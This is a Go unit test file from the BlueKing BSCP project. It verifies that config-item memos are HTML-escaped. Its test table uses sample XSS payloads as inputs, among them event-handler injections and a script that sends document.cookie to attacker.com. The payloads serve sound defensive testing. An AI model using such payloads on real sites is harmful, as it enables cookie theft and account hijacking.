/*
 * Tencent is pleased to support the open source community by making Blueking Container Service available.
 * Copyright (C) 2019 THL A29 Limited, a Tencent company. All rights reserved.
 * Licensed under the MIT License (the "License"); you may not use this file except
 * in compliance with the License. You may obtain a copy of the License at
 * http://opensource.org/licenses/MIT
 * Unless required by applicable law or agreed to in writing, software distributed under
 * the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,
 * either express or implied. See the License for the specific language governing permissions and
 * limitations under the License.
 */

package pbci

import (
	"strings"
	"testing"

	"github.com/TencentBlueKing/bk-bscp/pkg/dal/table"
)

func TestPbConfigItemSpec_MemoXSSEscape(t *testing.T) {
	tests := []struct {
		name     string
		memo     string
		expected string
	}{
		{
			name:     "normal memo no escaping needed",
			memo:     "this is a normal memo",
			expected: "this is a normal memo",
		},
		{
			name:     "empty memo",
			memo:     "",
			expected: "",
		},
		{
			name:     "chinese memo",
			memo:     "这是一个正常的备注",
			expected: "这是一个正常的备注",
		},
		{
			name:     "script tag is escaped",
			memo:     "<script>alert('xss')</script>",
			expected: "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;",
		},
		{
			name:     "img onerror is escaped",
			memo:     `<img src=x onerror="alert(1)">`,
			expected: `&lt;img src=x onerror=&#34;alert(1)&#34;&gt;`,
		},
		{
			name:     "svg onload is escaped",
			memo:     `<svg onload="alert(document.domain)">`,
			expected: `&lt;svg onload=&#34;alert(document.domain)&#34;&gt;`,
		},
		{
			name:     "iframe is escaped",
			memo:     `<iframe src="https://evil.com"></iframe>`,
			expected: `&lt;iframe src=&#34;https://evil.com&#34;&gt;&lt;/iframe&gt;`,
		},
		{
			name:     "cookie stealing payload is escaped",
			memo:     `<script>fetch('https://attacker.com/steal?t='+document.cookie)</script>`,
			expected: `&lt;script&gt;fetch(&#39;https://attacker.com/steal?t=&#39;+document.cookie)&lt;/script&gt;`,
		},
		{
			name:     "angle brackets are escaped",
			memo:     "config <key> = value",
			expected: "config &lt;key&gt; = value",
		},
		{
			name:     "ampersand is escaped",
			memo:     "key1=val1&key2=val2",
			expected: "key1=val1&amp;key2=val2",
		},
		{
			name:     "double quotes are escaped",
			memo:     `memo with "quotes"`,
			expected: `memo with &#34;quotes&#34;`,
		},
		{
			name:     "single quotes are escaped",
			memo:     "memo with 'quotes'",
			expected: "memo with &#39;quotes&#39;",
		},
		{
			name:     "mixed xss payload is fully escaped",
			memo:     `<div onmouseover="alert('XSS')">hover me</div>`,
			expected: `&lt;div onmouseover=&#34;alert(&#39;XSS&#39;)&#34;&gt;hover me&lt;/div&gt;`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			spec := &table.ConfigItemSpec{
				Name:     "test.yaml",
				Path:     "/etc/config",
				FileType: table.Text,
				FileMode: table.Unix,
				Memo:     tt.memo,
				Permission: &table.FilePermission{
					User:      "root",
					UserGroup: "root",
					Privilege: "755",
				},
			}

			result := PbConfigItemSpec(spec)

			if result.Memo != tt.expected {
				t.Errorf("PbConfigItemSpec() memo = %q, want %q", result.Memo, tt.expected)
			}
		})
	}
}

func TestPbConfigItemSpec_NilInput(t *testing.T) {
	result := PbConfigItemSpec(nil)
	if result != nil {
		t.Error("PbConfigItemSpec(nil) should return nil")
	}
}

func TestPbConfigItemSpec_MemoNoXSSChars(t *testing.T) {
	// Verify that normal text without HTML special chars passes through unchanged
	normalMemos := []string{
		"update database config for production",
		"修改生产环境数据库配置",
		"version 2.0 release config",
		"added timeout=30s retry=3",
		"config for app-01 cluster_v2",
	}

	for _, memo := range normalMemos {
		spec := &table.ConfigItemSpec{
			Name:     "test.yaml",
			Path:     "/etc",
			FileType: table.Text,
			FileMode: table.Unix,
			Memo:     memo,
			Permission: &table.FilePermission{
				User:      "root",
				UserGroup: "root",
				Privilege: "644",
			},
		}

		result := PbConfigItemSpec(spec)
		if result.Memo != memo {
			t.Errorf("Normal memo should not be modified: input=%q, got=%q", memo, result.Memo)
		}
	}
}

func TestPbConfigItemSpec_OtherFieldsUnchanged(t *testing.T) {
	// Verify that escaping memo does not affect other fields
	spec := &table.ConfigItemSpec{
		Name:     "test.yaml",
		Path:     "/etc/config",
		FileType: table.Text,
		FileMode: table.Unix,
		Memo:     "<script>alert(1)</script>",
		Permission: &table.FilePermission{
			User:      "root",
			UserGroup: "root",
			Privilege: "755",
		},
		Charset: table.UTF8,
	}

	result := PbConfigItemSpec(spec)

	if result.Name != "test.yaml" {
		t.Errorf("Name should be unchanged, got %q", result.Name)
	}
	if result.Path != "/etc/config" {
		t.Errorf("Path should be unchanged, got %q", result.Path)
	}
	if result.FileType != "text" {
		t.Errorf("FileType should be unchanged, got %q", result.FileType)
	}
	if result.FileMode != "unix" {
		t.Errorf("FileMode should be unchanged, got %q", result.FileMode)
	}
	if result.Charset != "UTF-8" {
		t.Errorf("Charset should be unchanged, got %q", result.Charset)
	}
	// Memo should be escaped
	if !strings.Contains(result.Memo, "&lt;script&gt;") {
		t.Errorf("Memo should be HTML escaped, got %q", result.Memo)
	}
}
